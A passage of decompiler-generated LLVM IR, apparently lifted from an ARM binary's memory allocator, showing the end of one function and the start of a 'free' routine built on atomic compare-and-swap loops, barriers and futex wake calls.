dec_label_pc_b224:                                ; preds = %dec_label_pc_b204
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_b228 = load i32, i32* @r4, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_b238 = icmp eq i32 %v0_b228, -38
  br i1 %v7_b238, label %dec_label_pc_b2b8, label %dec_label_pc_b240

dec_label_pc_b240:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b204, %dec_label_pc_b2b8
  %v0_b240 = load i32, i32* %fp.global-to-local, align 4
  %v1_b240 = add i32 %v0_b240, 4
  %v2_b240 = inttoptr i32 %v1_b240 to i32*
  %v3_b240 = load i32, i32* %v2_b240, align 4
  store i32 %v3_b240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b248

dec_label_pc_b248:                                ; preds = %dec_label_pc_b1f0, %dec_label_pc_b240
  %v0_b248 = phi i32 [ %v0_b1e8, %dec_label_pc_b1f0 ], [ %v3_b240, %dec_label_pc_b240 ]
  store i32 %v0_b248, i32* @sl, align 4
  %v1_b24c = urem i32 %v0_b248, 2
  %v2_b24c = icmp eq i32 %v1_b24c, 0
  br i1 %v2_b24c, label %dec_label_pc_b174, label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b248, %entry
  br label %dec_label_pc_b258

dec_label_pc_b258:                                ; preds = %dec_label_pc_b358, %dec_label_pc_b350, %dec_label_pc_b254
  %v1_b260 = phi i32 [ 1, %dec_label_pc_b358 ], [ 1, %dec_label_pc_b350 ], [ 0, %dec_label_pc_b254 ]
  %v2_b25c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_b25c, i32* @r4, align 4
  store i32 %v6_b158, i32* @r5, align 4
  store i32 %v9_b158, i32* @r6, align 4
  store i32 %v12_b158, i32* @r7, align 4
  store i32 %v15_b158, i32* @r8, align 4
  store i32 %v21_b158, i32* @sl, align 4
  ret i32 %v1_b260

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b2a8
  %v0_b26c = load i32, i32* @r5, align 4
  %v1_b26c = add i32 %v0_b26c, 12
  store i32 1, i32* @r2, align 4
  %v1_b274 = load i32, i32* %sb.global-to-local, align 4
  %v2_b274 = add i32 %v1_b26c, %v1_b274
  store i32 %v2_b274, i32* %r1.global-to-local, align 4
  %v0_b278 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v2_b280 = inttoptr i32 %v0_b278 to i32*
  %v3_b280 = call i32 @__wait(i32* %v2_b280, i32 %v2_b274)
  %v0_b284.pre = load i32, i32* @r5, align 4
  %v1_b288.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_b284

dec_label_pc_b284:                                ; preds = %dec_label_pc_b1a0, %dec_label_pc_b26c
  %v1_b288 = phi i32 [ %v1_b288.pre, %dec_label_pc_b26c ], [ ptrtoint (i32* @global_var_238f0.447 to i32), %dec_label_pc_b1a0 ]
  %v0_b284 = phi i32 [ %v0_b284.pre, %dec_label_pc_b26c ], [ %v3_b1a8, %dec_label_pc_b1a0 ]
  %v1_b284 = add i32 %v0_b284, 8
  store i32 %v1_b284, i32* %r3.global-to-local, align 4
  %v2_b288 = add i32 %v1_b284, %v1_b288
  store i32 %v2_b288, i32* @r7, align 4
  br label %dec_label_pc_b28c

dec_label_pc_b28c:                                ; preds = %dec_label_pc_b28c.dec_label_pc_b28c_crit_edge, %dec_label_pc_b284
  %v0_b28c = phi i32 [ %v0_b28c.pre, %dec_label_pc_b28c.dec_label_pc_b28c_crit_edge ], [ %v2_b288, %dec_label_pc_b284 ]
  %v1_b28c = inttoptr i32 %v0_b28c to i32*
  %v2_b28c = load i32, i32* %v1_b28c, align 4
  store i32 %v2_b28c, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v0_b28c, i32* @r2, align 4
  %v3_b29c = call i32 @__a_cas(i32 %v2_b28c, i32 1, i32 %v0_b28c)
  %v2_b2a0 = icmp eq i32 %v3_b29c, 0
  store i1 %v2_b2a0, i1* @cpsr_z, align 1
  br i1 %v2_b2a0, label %dec_label_pc_b2a8, label %dec_label_pc_b28c.dec_label_pc_b28c_crit_edge

dec_label_pc_b28c.dec_label_pc_b28c_crit_edge:    ; preds = %dec_label_pc_b28c
  %v0_b28c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b28c

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b28c
  %v0_b264 = load i32, i32* @r4, align 4
  %v2_b264 = icmp eq i32 %v0_b264, 0
  br i1 %v2_b264, label %dec_label_pc_b2ac, label %dec_label_pc_b26c

dec_label_pc_b2ac:                                ; preds = %dec_label_pc_b2a8
  %v0_b2ac = load i32, i32* %fp.global-to-local, align 4
  %v1_b2ac = add i32 %v0_b2ac, 4
  %v2_b2ac = inttoptr i32 %v1_b2ac to i32*
  %v3_b2ac = load i32, i32* %v2_b2ac, align 4
  store i32 %v3_b2ac, i32* @r0, align 4
  store i32 %v3_b2ac, i32* %r7.global-to-local, align 4
  %v0_b1c4.pre = load i32, i32* @r8, align 4
  %v0_b1c8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_b1c4

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b224
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b240

dec_label_pc_b2c8:                                ; preds = %.thread4
  %v0_b2c8 = load i32, i32* %fp.global-to-local, align 4
  %v1_b2c8 = add i32 %v0_b2c8, 12
  %v2_b2c8 = inttoptr i32 %v1_b2c8 to i32*
  %v3_b2c8 = load i32, i32* %v2_b2c8, align 4
  store i32 %v3_b2c8, i32* @r0, align 4
  %v1_b2cc = add i32 %v0_b2c8, 8
  %v2_b2cc = inttoptr i32 %v1_b2cc to i32*
  %v3_b2cc = load i32, i32* %v2_b2cc, align 4
  store i32 %v3_b2cc, i32* %r1.global-to-local, align 4
  %v9_b2d0 = icmp eq i32 %v3_b2c8, %v3_b2cc
  br i1 %v9_b2d0, label %dec_label_pc_b36c, label %dec_label_pc_b2c8.dec_label_pc_b2d8_crit_edge

dec_label_pc_b2c8.dec_label_pc_b2d8_crit_edge:    ; preds = %dec_label_pc_b2c8
  %v0_b2d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b2d8

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b2c8.dec_label_pc_b2d8_crit_edge, %dec_label_pc_b3cc
  %v2_b2e8 = phi i32 [ %v0_b2c8, %dec_label_pc_b2c8.dec_label_pc_b2d8_crit_edge ], [ %v0_b3cc, %dec_label_pc_b3cc ]
  %v0_b2d8 = phi i32 [ %v0_b2d8.pre, %dec_label_pc_b2c8.dec_label_pc_b2d8_crit_edge ], [ %v3_b3cc, %dec_label_pc_b3cc ]
  %v1_b2d8 = or i32 %v0_b2d8, 1
  store i32 %v1_b2d8, i32* %r7.global-to-local, align 4
  %v1_b2dc = and i32 %v0_b2d8, -2
  store i32 %v1_b2dc, i32* %r2.global-to-local, align 4
  %v2_b2e0 = add i32 %v1_b2dc, %v2_b2e8
  %v3_b2e0 = inttoptr i32 %v2_b2e0 to i32*
  %v4_b2e0 = load i32, i32* %v3_b2e0, align 4
  %v1_b2e4 = or i32 %v4_b2e0, 1
  store i32 %v1_b2e4, i32* %r3.global-to-local, align 4
  store i32 %v1_b2e4, i32* %v3_b2e0, align 4
  %v0_b2ec = load i32, i32* %r7.global-to-local, align 4
  %v1_b2ec = load i32, i32* %fp.global-to-local, align 4
  %v2_b2ec = add i32 %v1_b2ec, 4
  %v3_b2ec = inttoptr i32 %v2_b2ec to i32*
  store i32 %v0_b2ec, i32* %v3_b2ec, align 4
  %v0_b2f0 = load i32, i32* @r5, align 4
  %v1_b2f0 = add i32 %v0_b2f0, 8
  store i32 %v1_b2f0, i32* @r4, align 4
  %v0_b2f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2f4 = load i32, i32* @r0, align 4
  %v2_b2f4 = add i32 %v1_b2f4, 8
  %v3_b2f4 = inttoptr i32 %v2_b2f4 to i32*
  store i32 %v0_b2f4, i32* %v3_b2f4, align 4
  %v0_b2f8 = load i32, i32* @r4, align 4
  %v1_b2f8 = load i32, i32* %sb.global-to-local, align 4
  %v2_b2f8 = add i32 %v1_b2f8, %v0_b2f8
  %v3_b2f8 = inttoptr i32 %v2_b2f8 to i32*
  %v4_b2f8 = load i32, i32* %v3_b2f8, align 4
  store i32 %v4_b2f8, i32* %r3.global-to-local, align 4
  %v0_b2fc = load i32, i32* %fp.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 8
  %v2_b2fc = inttoptr i32 %v1_b2fc to i32*
  %v3_b2fc = load i32, i32* %v2_b2fc, align 4
  store i32 %v3_b2fc, i32* %r2.global-to-local, align 4
  %v2_b300 = icmp eq i32 %v4_b2f8, 0
  store i1 %v2_b300, i1* @cpsr_z, align 1
  %v0_b304 = load i32, i32* @r0, align 4
  %v2_b304 = add i32 %v3_b2fc, 12
  %v3_b304 = inttoptr i32 %v2_b304 to i32*
  store i32 %v0_b304, i32* %v3_b304, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r1, align 4
  %v0_b30c = load i32, i32* @r4, align 4
  %v1_b30c = load i32, i32* %sb.global-to-local, align 4
  %v2_b30c = add i32 %v1_b30c, %v0_b30c
  store i32 %v2_b30c, i32* %r6.global-to-local, align 4
  br i1 %v2_b300, label %dec_label_pc_b350, label %dec_label_pc_b314

dec_label_pc_b314:                                ; preds = %dec_label_pc_b2d8
  %v0_b314 = call i32 @__a_barrier()
  store i32 %v0_b314, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b31c = load i32, i32* @r4, align 4
  %v2_b31c = load i32, i32* @r1, align 4
  %v3_b31c = add i32 %v2_b31c, %v1_b31c
  %v4_b31c = inttoptr i32 %v3_b31c to i32*
  store i32 0, i32* %v4_b31c, align 4
  %v0_b320 = call i32 @__a_barrier()
  %v0_b324 = load i32, i32* @r5, align 4
  %v1_b324 = add i32 %v0_b324, 12
  store i32 %v1_b324, i32* %r3.global-to-local, align 4
  %v1_b328 = load i32, i32* @r1, align 4
  %v2_b328 = add i32 %v1_b328, %v1_b324
  %v3_b328 = inttoptr i32 %v2_b328 to i32*
  %v4_b328 = load i32, i32* %v3_b328, align 4
  store i32 %v4_b328, i32* %r2.global-to-local, align 4
  %v2_b32c = icmp eq i32 %v4_b328, 0
  br i1 %v2_b32c, label %dec_label_pc_b350, label %dec_label_pc_b334

dec_label_pc_b334:                                ; preds = %dec_label_pc_b314
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_b338 = load i32, i32* %r6.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_b348 = icmp eq i32 %v0_b338, -38
  br i1 %v7_b348, label %dec_label_pc_b358, label %dec_label_pc_b350

dec_label_pc_b350:                                ; preds = %dec_label_pc_b334, %dec_label_pc_b314, %dec_label_pc_b2d8
  br label %dec_label_pc_b258

dec_label_pc_b358:                                ; preds = %dec_label_pc_b334
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b258

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b2c8
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_b370 = load i32, i32* @r8, align 4
  %v1_b370 = sub i32 32, %v0_b370
  store i32 %v1_b370, i32* %r1.global-to-local, align 4
  %v7_b378 = lshr i32 1, %v1_b370
  store i32 %v7_b378, i32* %r4.global-to-local, align 4
  %v1_b37c = add i32 %v0_b370, -32
  %v6_b37c = icmp slt i32 %v1_b37c, 0
  %v7_b37c = icmp eq i32 %v0_b370, 32
  store i1 %v7_b37c, i1* @cpsr_z, align 1
  %v6_b380 = shl i32 1, %v0_b370
  store i32 %v6_b380, i32* %r3.global-to-local, align 4
  br i1 %v6_b37c, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_b36c
  %v7_b384 = shl i32 1, %v1_b37c
  store i32 %v7_b384, i32* %r4.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_b36c, %bb32
  %v0_b38c = phi i32 [ %v7_b378, %dec_label_pc_b36c ], [ %v7_b384, %bb32 ]
  %v1_b388 = sub i32 -1, %v6_b380
  store i32 %v1_b388, i32* %r7.global-to-local, align 4
  %v1_b38c = sub i32 -1, %v0_b38c
  store i32 %v1_b38c, i32* %r8.global-to-local, align 4
  store i32 %v1_b388, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b394

dec_label_pc_b394:                                ; preds = %dec_label_pc_b394.dec_label_pc_b394_crit_edge, %bb33
  %v1_b39c = phi i32 [ %v1_b39c.pre, %dec_label_pc_b394.dec_label_pc_b394_crit_edge ], [ %v1_b388, %bb33 ]
  %v2_b394 = load i32, i32* @global_var_238f0.447, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r2, align 4
  %v2_b39c = and i32 %v2_b394, %v1_b39c
  store i32 %v2_b39c, i32* %r1.global-to-local, align 4
  %v3_b3a0 = call i32 @__a_cas(i32 %v2_b394, i32 %v2_b39c, i32 ptrtoint (i32* @global_var_238f0.447 to i32))
  %v2_b3a4 = icmp eq i32 %v3_b3a0, 0
  store i1 %v2_b3a4, i1* @cpsr_z, align 1
  br i1 %v2_b3a4, label %dec_label_pc_b3ac, label %dec_label_pc_b394.dec_label_pc_b394_crit_edge

dec_label_pc_b394.dec_label_pc_b394_crit_edge:    ; preds = %dec_label_pc_b394
  %v1_b39c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b394

dec_label_pc_b3ac:                                ; preds = %dec_label_pc_b394
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* %r6.global-to-local, align 4
  %v0_b3b0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_b3b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b3b4.dec_label_pc_b3b4_crit_edge, %dec_label_pc_b3ac
  %v1_b3bc = phi i32 [ %v1_b3bc.pre, %dec_label_pc_b3b4.dec_label_pc_b3b4_crit_edge ], [ %v0_b3b0, %dec_label_pc_b3ac ]
  %v2_b3b4 = load i32, i32* @global_var_238f4.449, align 4
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* @r2, align 4
  %v2_b3bc = and i32 %v2_b3b4, %v1_b3bc
  store i32 %v2_b3bc, i32* %r1.global-to-local, align 4
  %v3_b3c0 = call i32 @__a_cas(i32 %v2_b3b4, i32 %v2_b3bc, i32 ptrtoint (i32* @global_var_238f4.449 to i32))
  %v2_b3c4 = icmp eq i32 %v3_b3c0, 0
  store i1 %v2_b3c4, i1* @cpsr_z, align 1
  br i1 %v2_b3c4, label %dec_label_pc_b3cc, label %dec_label_pc_b3b4.dec_label_pc_b3b4_crit_edge

dec_label_pc_b3b4.dec_label_pc_b3b4_crit_edge:    ; preds = %dec_label_pc_b3b4
  %v1_b3bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b3b4

dec_label_pc_b3cc:                                ; preds = %dec_label_pc_b3b4
  %v0_b3cc = load i32, i32* %fp.global-to-local, align 4
  %v1_b3cc = add i32 %v0_b3cc, 4
  %v2_b3cc = inttoptr i32 %v1_b3cc to i32*
  %v3_b3cc = load i32, i32* %v2_b3cc, align 4
  store i32 %v3_b3cc, i32* %r7.global-to-local, align 4
  %v1_b3d0 = add i32 %v0_b3cc, 12
  %v2_b3d0 = inttoptr i32 %v1_b3d0 to i32*
  %v3_b3d0 = load i32, i32* %v2_b3d0, align 4
  store i32 %v3_b3d0, i32* @r0, align 4
  %v1_b3d4 = add i32 %v0_b3cc, 8
  %v2_b3d4 = inttoptr i32 %v1_b3d4 to i32*
  %v3_b3d4 = load i32, i32* %v2_b3d4, align 4
  store i32 %v3_b3d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b2d8

; uselistorder directives
  uselistorder i32 %v3_b3cc, { 1, 0 }
  uselistorder i32 %v0_b3cc, { 1, 2, 3, 0 }
  uselistorder i32 %v2_b3b4, { 1, 0 }
  uselistorder i32 %v2_b394, { 1, 0 }
  uselistorder i32 %v1_b388, { 2, 1, 0 }
  uselistorder i32 %v0_b2d8, { 1, 0 }
  uselistorder i32 %v3_b2ac, { 1, 2, 0 }
  uselistorder i32 %v0_b28c, { 1, 2, 0 }
  uselistorder i32 %v0_b248, { 0, 2, 1 }
  uselistorder i32 %v0_b1e8, { 1, 0 }
  uselistorder i32 %v4_b1d4, { 1, 0 }
  uselistorder i32 %v4_b1c8, { 1, 0 }
  uselistorder i32 %v3_b1a8, { 2, 1, 0 }
  uselistorder i32 %v0_b1a8, { 1, 0 }
  uselistorder i32 %v1_b178, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v3_b174, { 1, 0 }
  uselistorder i32 %v1_b1bc, { 1, 2, 0 }
  uselistorder i32 %v3_b15c, { 1, 2, 0, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_b2d8, { 1, 0 }
  uselistorder label %dec_label_pc_b284, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b240, { 2, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_b1a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b174, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_b3e8 = load i32, i32* @r4, align 4
  %v6_b3e8 = load i32, i32* @r5, align 4
  %v9_b3e8 = load i32, i32* @r6, align 4
  %v12_b3e8 = load i32, i32* @r7, align 4
  %v15_b3e8 = load i32, i32* @r8, align 4
  %v18_b3e8 = load i32, i32* @sb, align 4
  %v21_b3e8 = load i32, i32* @sl, align 4
  %v24_b3e8 = load i32, i32* @fp, align 4
  %v27_b3e8 = load i32, i32* @lr, align 4
  %v0_b3ec = load i32, i32* %r0.global-to-local, align 4
  %v2_b3ec = icmp eq i32 %v0_b3ec, 0
  br i1 %v2_b3ec, label %dec_label_pc_b7ac, label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %entry
  %v1_b3f8 = add i32 %v0_b3ec, -8
  store i32 %v1_b3f8, i32* @r8, align 4
  %v1_b3fc = add i32 %v0_b3ec, -4
  %v2_b3fc = inttoptr i32 %v1_b3fc to i32*
  %v3_b3fc = load i32, i32* %v2_b3fc, align 4
  %v1_b400 = urem i32 %v3_b3fc, 2
  store i32 %v1_b400, i32* @r3, align 4
  %v2_b400 = icmp eq i32 %v1_b400, 0
  br i1 %v2_b400, label %dec_label_pc_b848, label %dec_label_pc_b408

dec_label_pc_b408:                                ; preds = %dec_label_pc_b3f8
  %v1_b408 = and i32 %v3_b3fc, -2
  store i32 %v1_b408, i32* %r0.global-to-local, align 4
  %v2_b40c = add i32 %v1_b408, %v1_b3f8
  %v3_b40c = inttoptr i32 %v2_b40c to i32*
  %v4_b40c = load i32, i32* %v3_b40c, align 4
  store i32 %v4_b40c, i32* %r3.global-to-local, align 4
  %v9_b410 = icmp eq i32 %v3_b3fc, %v4_b40c
  br i1 %v9_b410, label %.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_b408
  store i32 0, i32* @r3, align 4
  call void @llvm.trap()
  unreachable

.preheader:                                       ; preds = %dec_label_pc_b408
  store i32 %v2_b40c, i32* @sb, align 4
  store i32 %v1_b408, i32* @fp, align 4
  br label %bb62

.loopexit:                                        ; preds = %dec_label_pc_b5d0
  %v0_b43c.pre = load i32, i32* @r8, align 4
  br label %bb62

bb62:                                             ; preds = %.preheader, %.loopexit
  %v0_b43c = phi i32 [ %v0_b43c.pre, %.loopexit ], [ %v1_b3f8, %.preheader ]
  %v0_b438 = phi i32 [ %v0_b438.pre, %.loopexit ], [ %v2_b40c, %.preheader ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.5, %.loopexit ], [ 0, %.preheader ]
  %v1_b438 = add i32 %v0_b438, 4
  %v2_b438 = inttoptr i32 %v1_b438 to i32*
  %v3_b438 = load i32, i32* %v2_b438, align 4
  store i32 %v3_b438, i32* %r3.global-to-local, align 4
  %v1_b43c = inttoptr i32 %v0_b43c to i32*
  %v2_b43c = load i32, i32* %v1_b43c, align 4
  store i32 %v2_b43c, i32* %r2.global-to-local, align 4
  %v2_b440 = and i32 %v2_b43c, %v3_b438
  store i32 %v2_b440, i32* %r3.global-to-local, align 4
  %v1_b444 = urem i32 %v2_b440, 2
  %v2_b444 = icmp eq i32 %v1_b444, 0
  br i1 %v2_b444, label %dec_label_pc_b584.preheader, label %.dec_label_pc_b44c_crit_edge

.dec_label_pc_b44c_crit_edge:                     ; preds = %bb62
  %v0_b44c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_b44c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b60c, %.dec_label_pc_b44c_crit_edge
  %v1_b45c = phi i32 [ %v0_b438, %.dec_label_pc_b44c_crit_edge ], [ %v2_b60c, %dec_label_pc_b60c ]
  %v0_b458 = phi i32 [ %v0_b44c.pre, %.dec_label_pc_b44c_crit_edge ], [ %v2_b610, %dec_label_pc_b60c ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %.dec_label_pc_b44c_crit_edge ], [ %stack_var_-44.6, %dec_label_pc_b60c ]
  %v3_b44c = udiv i32 %v0_b458, 16
  %v1_b450 = add nsw i32 %v3_b44c, -1
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  %v1_b458 = or i32 %v0_b458, 1
  store i32 %v1_b458, i32* %r3.global-to-local, align 4
  %v2_b45c = inttoptr i32 %v1_b45c to i32*
  store i32 %v1_b458, i32* %v2_b45c, align 4
  %v0_b460 = load i32, i32* %r3.global-to-local, align 4
  %v1_b460 = load i32, i32* @r8, align 4
  %v2_b460 = add i32 %v1_b460, 4
  %v3_b460 = inttoptr i32 %v2_b460 to i32*
  store i32 %v0_b460, i32* %v3_b460, align 4
  %tmp = icmp ult i32 %v1_b450, 33
  %v4_b464 = load i32, i32* %r0.global-to-local, align 4
  br i1 %tmp, label %.thread, label %dec_label_pc_b46c

.thread:                                          ; preds = %dec_label_pc_b44c
  store i32 %v4_b464, i32* @sl, align 4
  br label %dec_label_pc_b484

dec_label_pc_b46c:                                ; preds = %dec_label_pc_b44c
  %tmp80 = icmp ugt i32 %v4_b464, 7168
  br i1 %tmp80, label %.thread45, label %dec_label_pc_b478

.thread45:                                        ; preds = %dec_label_pc_b46c
  store i32 63, i32* @sl, align 4
  br label %dec_label_pc_b484

dec_label_pc_b478:                                ; preds = %dec_label_pc_b46c
  %v3_b47c = udiv i32 %v4_b464, 2097152
  store i32 %v3_b47c, i32* %r0.global-to-local, align 4
  %v1_b480 = add nsw i32 %v3_b47c, -496
  store i32 %v1_b480, i32* @sl, align 4
  br label %dec_label_pc_b484

dec_label_pc_b484:                                ; preds = %.thread45, %.thread, %dec_label_pc_b478
  %v0_b48c = phi i32 [ 63, %.thread45 ], [ %v4_b464, %.thread ], [ %v1_b480, %dec_label_pc_b478 ]
  %v3_b488 = load i32, i32* @global_var_23e94.445, align 4
  store i32 %v3_b488, i32* %r2.global-to-local, align 4
  %v3_b48c = mul i32 %v0_b48c, 16
  store i32 %v3_b48c, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r0.global-to-local, align 4
  %v1_b494 = or i32 %v3_b48c, 8
  store i32 %v1_b494, i32* %r3.global-to-local, align 4
  %v2_b498 = icmp eq i32 %v3_b488, 0
  store i1 %v2_b498, i1* @cpsr_z, align 1
  %v2_b49c = add i32 %v1_b494, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v2_b49c, i32* @r5, align 4
  br i1 %v2_b498, label %dec_label_pc_b4a4, label %dec_label_pc_b7dc

dec_label_pc_b4a4.loopexit:                       ; preds = %dec_label_pc_b804
  %v0_b4a8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_b4a4

dec_label_pc_b4a4:                                ; preds = %dec_label_pc_b4a4.loopexit, %dec_label_pc_b484
  %v0_b4a8 = phi i32 [ %v0_b4a8.pre, %dec_label_pc_b4a4.loopexit ], [ %v0_b48c, %dec_label_pc_b484 ]
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r2.global-to-local, align 4
  %v1_b4a8 = add i32 %v0_b4a8, 1
  %v4_b4ac = mul i32 %v1_b4a8, 16
  %v5_b4ac = add i32 %v4_b4ac, ptrtoint (i32* @global_var_238f0.447 to i32)
  %v6_b4ac = inttoptr i32 %v5_b4ac to i32*
  %v7_b4ac = load i32, i32* %v6_b4ac, align 4
  store i32 %v7_b4ac, i32* %r3.global-to-local, align 4
  %v2_b4b0 = icmp eq i32 %v7_b4ac, 0
  br i1 %v2_b4b0, label %dec_label_pc_b868, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b4a4, %dec_label_pc_b868
  store i32 ptrtoint (i8** @global_var_23e88.411 to i32), i32* @r1, align 4
  %v3_b4c4 = load i32, i32* @global_var_23e94.445, align 4
  store i32 %v3_b4c4, i32* %r3.global-to-local, align 4
  %v2_b4c8 = icmp eq i32 %v3_b4c4, 0
  store i1 %v2_b4c8, i1* @cpsr_z, align 1
  br i1 %v2_b4c8, label %dec_label_pc_b4d0, label %dec_label_pc_b808

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b838, %dec_label_pc_b4c0
  %v0_b4d0 = load i32, i32* @r8, align 4
  %v1_b4d0 = inttoptr i32 %v0_b4d0 to i32*
  %v2_b4d0 = load i32, i32* %v1_b4d0, align 4
  store i32 %v2_b4d0, i32* %r2.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @sb, align 4
  %v1_b4d4 = add i32 %v0_b4d4, 4
  %v2_b4d4 = inttoptr i32 %v1_b4d4 to i32*
  %v3_b4d4 = load i32, i32* %v2_b4d4, align 4
  %v2_b4d8 = and i32 %v3_b4d4, %v2_b4d0
  store i32 %v2_b4d8, i32* %r3.global-to-local, align 4
  %v1_b4dc = urem i32 %v2_b4d8, 2
  store i32 %v1_b4dc, i32* @r2, align 4
  %v2_b4dc = icmp eq i32 %v1_b4dc, 0
  br i1 %v2_b4dc, label %dec_label_pc_b4e4, label %dec_label_pc_b62c

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b4d0
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r0, align 4
  %v3_b4e8 = load i32, i32* @global_var_23cf8.455, align 4
  store i32 %v3_b4e8, i32* %r3.global-to-local, align 4
  %v2_b4ec = icmp eq i32 %v3_b4e8, 0
  store i1 %v2_b4ec, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r4, align 4
  br i1 %v2_b4ec, label %dec_label_pc_b530, label %dec_label_pc_b4f8

dec_label_pc_b4f8:                                ; preds = %dec_label_pc_b4e4
  %v0_b4f8 = call i32 @__a_barrier()
  store i32 %v0_b4f8, i32* @r0, align 4
  %v0_b4fc = load i32, i32* @r2, align 4
  %v2_b4fc = add i32 %v0_b4f8, 1032
  %v3_b4fc = inttoptr i32 %v2_b4fc to i32*
  store i32 %v0_b4fc, i32* %v3_b4fc, align 4
  %v0_b500 = call i32 @__a_barrier()
  store i32 %v0_b500, i32* @r0, align 4
  %v1_b504 = add i32 %v0_b500, 1036
  %v2_b504 = inttoptr i32 %v1_b504 to i32*
  %v3_b504 = load i32, i32* %v2_b504, align 4
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  %v2_b508 = icmp eq i32 %v3_b504, 0
  br i1 %v2_b508, label %dec_label_pc_b530, label %dec_label_pc_b510

dec_label_pc_b510:                                ; preds = %dec_label_pc_b4f8
  %v1_b514 = add i32 %v0_b500, 1032
  store i32 %v1_b514, i32* @r0, align 4
  store i32 240, i32* @r7, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_b528 = icmp eq i32 %v0_b500, -1070
  br i1 %v7_b528, label %dec_label_pc_b884, label %dec_label_pc_b530

dec_label_pc_b530:                                ; preds = %dec_label_pc_b510, %dec_label_pc_b4f8, %dec_label_pc_b4e4, %dec_label_pc_b884
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r1, align 4
  %v0_b534 = load i32, i32* @r6, align 4
  %v1_b534 = add i32 %v0_b534, 8
  store i32 %v1_b534, i32* @r2, align 4
  %v2_b538 = add i32 %v0_b534, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 8)
  %v3_b538 = inttoptr i32 %v2_b538 to i32*
  %v4_b538 = load i32, i32* %v3_b538, align 4
  store i32 %v4_b538, i32* %r3.global-to-local, align 4
  %v2_b53c = icmp eq i32 %v4_b538, 0
  store i1 %v2_b53c, i1* @cpsr_z, align 1
  store i32 %v2_b538, i32* @r4, align 4
  br i1 %v2_b53c, label %dec_label_pc_b584.preheader, label %dec_label_pc_b548

dec_label_pc_b548:                                ; preds = %dec_label_pc_b530
